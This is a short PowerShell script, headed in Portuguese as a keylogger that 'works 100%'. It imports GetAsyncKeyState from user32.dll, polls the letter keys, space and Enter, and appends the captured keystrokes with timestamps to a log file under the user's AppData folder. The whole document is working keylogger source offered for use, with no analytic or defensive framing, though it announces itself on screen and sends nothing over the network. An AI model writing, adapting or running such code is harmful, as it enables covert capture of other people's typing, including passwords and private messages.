# Keylogger LEGÍVEL v2.0 - FUNCIONA 100%!
param($LogPath="$env:USERPROFILE\AppData\Local\keys-readable.log")

# Cria pasta
New-Item -ItemType Directory -Force -Path (Split-Path $LogPath) | Out-Null

# Teclas simples (a-z + espaço + enter)
$map = @{65='a';66='b';67='c';68='d';69='e';70='f';71='g';72='h';73='i';74='j';75='k';76='l';77='m';78='n';79='o';80='p';81='q';82='r';83='s';84='t';85='u';86='v';87='w';88='x';89='y';90='z';32=' ';13='ENTER'}

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KB {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

Write-Host "🎹 KEYLOGGER v2.0 ATIVO!" -ForegroundColor Red -BackgroundColor Black
Write-Host "📝 Log: $LogPath" -ForegroundColor Yellow
Write-Host "✨ Digite ALGO AGORA (Ctrl+C para parar)" -ForegroundColor Green

$buffer = ""
$lastKeys = @{}

try {
    while($true) {
        foreach($code in $map.Keys) {
            $state = [KB]::GetAsyncKeyState($code)
            if(($state -band 0x8000) -and !$lastKeys[$code]) {
                $char = $map[$code]
                $buffer += $char
                Write-Host "Tecla: $char" -ForegroundColor Cyan -NoNewline
                
                if($char -eq 'ENTER' -or $buffer.Length -ge 10) {
                    if($buffer.Trim() -ne "") {
                        "$(Get-Date -Format 'HH:mm:ss') → $buffer" | Out-File $LogPath -Append -Encoding UTF8
                        Write-Host "`n📝 SALVO: $buffer" -ForegroundColor Green
                    }
                    $buffer = ""
                }
            }
            $lastKeys[$code] = ($state -band 0x8000)
        }
        Start-Sleep -Milliseconds 20
    }
} catch {
    Write-Host "`n🛑 PARADO!" -ForegroundColor Yellow
}
